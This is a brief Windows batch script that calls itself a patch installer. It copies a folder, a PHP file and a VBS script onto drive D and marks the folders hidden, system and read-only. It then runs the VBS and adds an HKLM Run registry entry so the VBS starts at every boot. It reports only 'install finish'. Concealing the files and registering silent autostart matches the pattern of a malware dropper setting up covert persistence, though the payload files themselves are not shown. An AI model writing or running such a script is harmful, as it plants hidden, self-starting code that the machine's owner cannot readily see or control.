@echo off
mkdir d:\patch
xcopy patch d:\patch /Y /S /Q /R
attrib +H +R +S d:\patch
mkdir d:\enter\11\22
copy /Y patch.php d:\enter\11\22\patch.php
copy /Y run.vbs d:\patch\run.vbs
attrib +H +R +S d:\enter
set cur=%cd%
d:\patch\run.vbs d:\patch d:\enter\11\22\
reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v patch /t REG_SZ /d "d:\patch\run.vbs d:\patch d:\enter\11\22" /f
echo "install finish"
cd /d %cur%
@echo on
